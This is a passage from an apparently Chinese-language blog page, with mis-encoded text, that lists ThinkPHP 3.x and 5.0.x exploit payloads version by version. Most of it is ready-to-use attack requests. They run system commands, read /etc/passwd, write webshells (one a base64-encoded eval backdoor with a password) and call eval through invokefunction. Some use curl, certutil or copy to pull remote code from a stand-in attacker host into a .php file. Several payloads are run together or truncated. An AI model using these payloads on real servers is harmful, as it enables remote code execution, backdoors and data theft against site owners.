class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¯»å–æ—¥å¿—æ–‡ä»¶</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\C</span>ommon<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21_06_30.log</span><br></pre></td></tr></table></figure><p>å¼€å¯debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶é»˜è®¤è·¯å¾„</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\H</span>ome<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Home/21_06_30.log</span><br></pre></td></tr></table></figure><p>ä¼ å…¥æ¶æ„æ–‡ä»¶ï¼Œä¼ å…¥æ–‡ä»¶åœ°å€</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./test.txt</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;info</span>[<span class="string">_filename</span>]=.\</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-x-æ¼æ´"><a href="#ThinkPHP-5-x-æ¼æ´" class="headerlink" title="ThinkPHP 5.x æ¼æ´"></a>ThinkPHP 5.x æ¼æ´</h2><p>tpæ¡†æ¶ç³»åˆ—ä¸­ï¼Œ5.0.x è·Ÿ 5.1.x ä¸­ï¼Œå„ä¸ªç³»åˆ—é‡Œçš„pocæ˜¯å‡ ä¹ä¸ºé€šç”¨çš„<br>5.0.1ä¸­æŸä¸ªpocåœ¨5.0.3ä¸­ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬ç¢°åˆ°5.0.8çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ç”¨5.0.1<br>æˆ– 5.0.5ç­‰ 5.0.x ç³»åˆ—çš„pocå»å°è¯•ä½¿ç”¨ï¼Œ5.1.x ç³»åˆ—åŒç†</p><p>æ¼æ´æˆå› </p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è·¯ç”±æ§åˆ¶ä¸ä¸¥è°¨ï¼Œé»˜è®¤ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œä»è€Œå¯ä»¥ä»»æ„è°ƒç”¨Thinkphpçš„ç±»åº“</span><br><span class="line"></span><br><span class="line">ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">Request</span>ä¸­çš„å˜é‡è¦†ç›–å¯¼è‡´RCE</span><br><span class="line"><span class="number">2.</span>è·¯ç”±æ§åˆ¶ä¸ä¸¥è°¨å¯¼è‡´çš„RCE</span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-1"><a href="#Thinkphp-5-0-1" class="headerlink" title="Thinkphp 5.0.1"></a>Thinkphp 5.0.1</h3><p>ï¼ˆ1ï¼‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´</p><p>poc1</p><pre><code>http://wwww.com/publics=phpinfo()&amp;_method=__construct&amp;filter=assert_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1</code></pre><p>poc2</p><pre><code>http:/xxxx.com/?s=index/index/indexs=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system</code></pre><p>ï¼ˆ2ï¼‰æ·±å…¥åˆ©ç”¨</p><p>ä½¿ç”¨postæäº¤</p><p>1ã€ä½¿ç”¨assertå‡½æ•°</p><pre><code>s=phpinfo()&amp;_method=__construct&amp;filter=assert</code></pre><p>2ã€includeå‡½æ•°ï¼Œå¯ä»¥æ ¹æ®æ­¤å‡½æ•°æŸ¥çœ‹ä¸€äº›æ–‡ä»¶åŠå…¶é…ç½®</p><pre><code>s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert</code></pre><p>3ã€file_put_contentså‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶</p><pre><code>s=file_put_contents(&#39;/data/wwwroot/test.com/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>4ã€è¯»å–æ–‡ä»¶</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccesss=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert//ps:å¦‚æœä¸åŠ .. è¯·åŠ ä¸Šå®Œæ•´è·¯å¾„</code></pre><p>5ã€var_dumpå‡½æ•°ï¼Œå¯ä»¥æŸ¥çœ‹è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹</p><pre><code>s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>6ã€å¤åˆ¶æ–‡ä»¶</p><pre><code>s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/test.com/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser</code></pre><h3 id="Thinkphp-5-0-2"><a href="#Thinkphp-5-0-2" class="headerlink" title="Thinkphp 5.0.2"></a>Thinkphp 5.0.2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-3"><a href="#Thinkphp-5-0-3" class="headerlink" title="Thinkphp 5.0.3"></a>Thinkphp 5.0.3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-4"><a href="#Thinkphp-5-0-4" class="headerlink" title="Thinkphp 5.0.4"></a>Thinkphp 5.0.4</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-5"><a href="#Thinkphp-5-0-5" class="headerlink" title="Thinkphp 5.0.5"></a>Thinkphp 5.0.5</h3><p>wafå¯¹evalè¿›è¡Œäº†æ‹¦æˆª</p><p>ç¦æ­¢äº†assertå‡½æ•°å¯¹evalå‡½æ•°åé¢çš„æ‹¬å·è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤</p><p>å¯¹file_get_contentså‡½æ•°åé¢çš„æ‹¬å·è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://test.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=</span><span class="php"><span class="meta">&lt;?php</span> <span class="comment">/*1111*/</span><span class="comment">/***/</span>file_put_contents<span class="comment">/*1**/</span>(<span class="comment">/***/</span><span class="string">&#x27;index11.php&#x27;</span><span class="comment">/**/</span>,file_get_contents(<span class="comment">/**/</span><span class="string">&#x27;https://www.hack.com/xxx.js&#x27;</span>))<span class="comment">/**/</span>;<span class="comment">/**/</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-6"><a href="#Thinkphp-5-0-6" class="headerlink" title="Thinkphp 5.0.6"></a>Thinkphp 5.0.6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-7"><a href="#Thinkphp-5-0-7" class="headerlink" title="Thinkphp 5.0.7"></a>Thinkphp 5.0.7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-8"><a href="#Thinkphp-5-0-8" class="headerlink" title="Thinkphp 5.0.8"></a>Thinkphp 5.0.8</h3><pre><code>http://test.com/public_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1c=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™å…¥æ–‡ä»¶</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=uploads/1.php&amp;vars[1][]=&lt;?php ?&gt;</code></pre><blockquote><p>ç›´æ¥ç”¨èœåˆ€è¿</p></blockquote><pre><code>http://test.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><blockquote><p>getshell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-9"><a href="#Thinkphp-5-0-9" class="headerlink" title="Thinkphp 5.0.9"></a>Thinkphp 5.0.9</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>POSTs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=asser</code></pre><h3 id="Thinkphp-5-0-10"><a href="#Thinkphp-5-0-10" class="headerlink" title="Thinkphp 5.0.10"></a>Thinkphp 5.0.10</h3><p>postæäº¤</p><pre><code>http://test.com/public/index.php?s=index/index/indexs=whoami&amp;_method=__construct&amp;method&amp;filter[]=syste</code></pre><h3 id="Thinkphp-5-0-11"><a href="#Thinkphp-5-0-11" class="headerlink" title="Thinkphp 5.0.11"></a>Thinkphp 5.0.11</h3><pre><code>http://test.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.ph</code></pre><h3 id="Thinkphp-5-0-12"><a href="#Thinkphp-5-0-12" class="headerlink" title="Thinkphp 5.0.12"></a>Thinkphp 5.0.12</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-13"><a href="#Thinkphp-5-0-13" class="headerlink" title="Thinkphp 5.0.13"></a>Thinkphp 5.0.13</h3><blockquote><p>postæäº¤</p></blockquote><pre><code>test.com/?s=index/indexs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><p>è¡¥å……</p><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="http://test.com/?s=captcha/calc">http://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-14"><a href="#Thinkphp-5-0-14" class="headerlink" title="Thinkphp 5.0.14"></a>Thinkphp 5.0.14</h3><p>1ã€å¸¸è§„å‘½ä»¤</p><pre><code>?s=index/think\app/invokefunction&amp;function=&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php.jpg&amp;vars[1][]=%3C?php%20phpinfo();?3E</code></pre><p>2ã€evalï¼ˆ&#39;&#39;ï¼‰å’Œassertï¼ˆ&#39;&#39;ï¼‰è¢«æ‹¦æˆªï¼Œå‘½ä»¤å‡½æ•°è¢«ç¦æ­¢</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</code></pre><p>3ã€åŸºäºphp7.2ç¯å¢ƒä¸‹</p><pre><code>http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index111.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;å†™è¿›å»å‘ç°è½¬ä¹‰äº†å°–æ‹¬å·</code></pre><p>4ã€é€šè¿‡copyå‡½æ•°</p><pre><code> http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.ph</code></pre><h3 id="Thinkphp-5-0-15"><a href="#Thinkphp-5-0-15" class="headerlink" title="Thinkphp 5.0.15"></a>Thinkphp 5.0.15</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-16"><a href="#Thinkphp-5-0-16" class="headerlink" title="Thinkphp 5.0.16"></a>Thinkphp 5.0.16</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>posts=file_put_contents(&#39;/ç»å¯¹è·¯å¾„/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert    å¯†ç aaaa</code></pre><blockquote><p>ç›´æ¥èœåˆ€è¿</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><h3 id="Thinkphp-5-0-17"><a href="#Thinkphp-5-0-17" class="headerlink" title="Thinkphp 5.0.17"></a>Thinkphp 5.0.17</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-18"><a href="#Thinkphp-5-0-18" class="headerlink" title="Thinkphp 5.0.18"></a>Thinkphp 5.0.18</h3><p>1ã€windows</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()</code></pre><p>2ã€ä½¿ç”¨certutil</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php</code></pre><p>ç”±äºæ ¹ç›®å½•æ²¡å†™æƒé™ï¼Œæ‰€</p><h3 id="Thinkphp-5-0-19"><a href="#Thinkphp-5-0-19" class="headerlink" title="Thinkphp 5.0.19"></a>Thinkphp 5.0.19</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-20"><a href="#Thinkphp-5-0-20" class="headerlink" title="Thinkphp 5.0.20"></a>Thinkphp 5.0.20</h3><blockquote><p><a 